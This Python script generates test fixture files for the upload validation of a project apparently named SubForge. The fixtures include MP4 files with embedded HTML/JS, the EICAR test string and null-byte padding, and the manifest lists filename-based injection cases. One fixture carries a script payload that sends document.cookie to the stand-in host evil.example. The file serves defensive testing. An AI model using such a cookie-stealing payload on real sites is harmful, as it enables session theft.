#!/usr/bin/env python3
"""Generate malicious test fixture files for security injection testing.

Run once to (re)create all fixture files:
    python tests/fixtures/generate_fixtures.py

All files here are SAFE test vectors — they exercise the upload validation
pipeline without containing real malware. Each file is annotated with the
attack type it simulates.

Fixture inventory:
    polyglot_mp4_html.mp4       — valid MP4 magic + embedded <script> tag
    wrong_ext_html.mp4          — HTML content with .mp4 extension (magic mismatch)
    eicar_mp4.mp4               — EICAR AV test string wrapped in MP4 box
    path_traversal.mp4          — safe content; uploaded with ../../ filename
    null_bytes.mp4              — valid MP4 magic + NUL-padded payload
    shell_injection.mp4         — safe content; filename contains $() backticks
    sql_injection.mp4           — safe content; filename contains SQL fragment
    xss_filename.mp4            — safe content; filename contains <img onerror=…>
    oversized_stub.mp4          — 1-byte stub for large-file tests (actual size
                                  enforced via Content-Length in tests)
    valid_minimal.mp4           — smallest valid-looking MP4 (no injection); used
                                  as a clean-baseline control in tests
"""

import struct
from pathlib import Path

FIXTURES = Path(__file__).parent


def mp4_ftyp() -> bytes:
    """24-byte ISO MP4 file-type box."""
    size = struct.pack(">I", 24)
    box = b"ftyp"
    brand = b"mp42"
    version = struct.pack(">I", 0)
    compat = b"mp42" + b"isom"
    return size + box + brand + version + compat


def write(name: str, data: bytes) -> None:
    path = FIXTURES / name
    path.write_bytes(data)
    print(f"  wrote {path.name:40s}  {len(data):>8,} bytes")


# ── Fixtures ────────────────────────────────────────────────────────────────


def polyglot_mp4_html() -> bytes:
    """MP4 magic bytes + HTML/JS payload — tests XSS reflection prevention."""
    payload = (
        b"<html><head>"
        b"<script>fetch('https://evil.example/steal?c='+document.cookie)</script>"
        b"</head><body>polyglot content</body></html>"
    )
    return mp4_ftyp() + payload


def wrong_ext_html() -> bytes:
    """Pure HTML, .mp4 extension — tests magic-byte vs extension mismatch."""
    return b"<!DOCTYPE html><html><body><script>alert('xss')</script></body></html>"


def eicar_mp4() -> bytes:
    """EICAR standard AV test string wrapped in an MP4 box.

    The EICAR string is a universally recognised, harmless test file that AV
    engines report as a test virus.  Embedding it verifies ClamAV integration
    when enabled.
    """
    eicar = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    return mp4_ftyp() + eicar


def null_bytes_mp4() -> bytes:
    """MP4 header + NUL bytes + embedded 'cmd.exe' string."""
    return mp4_ftyp() + b"\x00" * 512 + b"cmd.exe" + b"\x00" * 128


def valid_minimal() -> bytes:
    """Smallest sensible-looking MP4: ftyp box only (no media data)."""
    return mp4_ftyp()


def oversized_stub() -> bytes:
    """One-byte stub; real large-file tests set Content-Length artificially."""
    return b"\x00"


# ── Metadata file (JSON) ────────────────────────────────────────────────────

MANIFEST = """{
  "description": "Security test fixture files for SubForge injection testing",
  "safe": true,
  "note": "All files are harmless test vectors. Do not add real malware.",
  "fixtures": [
    {"file": "valid_minimal.mp4",        "attack": "none",            "expect": "accepted or pipeline error"},
    {"file": "polyglot_mp4_html.mp4",    "attack": "xss_reflection",  "expect": "no <script> in response"},
    {"file": "wrong_ext_html.mp4",       "attack": "magic_mismatch",  "expect": "rejected 400/415"},
    {"file": "eicar_mp4.mp4",            "attack": "av_test_string",  "expect": "EICAR not reflected"},
    {"file": "null_bytes.mp4",           "attack": "null_byte",       "expect": "no 500 crash"},
    {"file": "oversized_stub.mp4",       "attack": "oversize",        "expect": "rejected 413"},
    {"file": "path_traversal.mp4",       "attack": "path_traversal",  "expect": "filename sanitized, no 500"},
    {"file": "shell_injection.mp4",      "attack": "shell_injection", "expect": "no 500, no command exec"},
    {"file": "sql_injection.mp4",        "attack": "sql_injection",   "expect": "no 500, no DB error"},
    {"file": "xss_filename.mp4",         "attack": "xss_filename",    "expect": "payload not reflected raw"}
  ]
}
"""


def main() -> None:
    print("Generating security test fixtures...")
    write("valid_minimal.mp4", valid_minimal())
    write("polyglot_mp4_html.mp4", polyglot_mp4_html())
    write("wrong_ext_html.mp4", wrong_ext_html())
    write("eicar_mp4.mp4", eicar_mp4())
    write("null_bytes.mp4", null_bytes_mp4())
    write("oversized_stub.mp4", oversized_stub())

    # Files whose attack vector is the *filename*, not content — same safe body
    safe_body = mp4_ftyp() + b"safe content for filename-vector tests"
    write("path_traversal.mp4", safe_body)
    write("shell_injection.mp4", safe_body)
    write("sql_injection.mp4", safe_body)
    write("xss_filename.mp4", safe_body)

    (FIXTURES / "manifest.json").write_text(MANIFEST)
    print("  wrote manifest.json")
    print(f"\nDone -- {len(list(FIXTURES.glob('*.mp4')))} fixture files in {FIXTURES}")


if __name__ == "__main__":
    main()
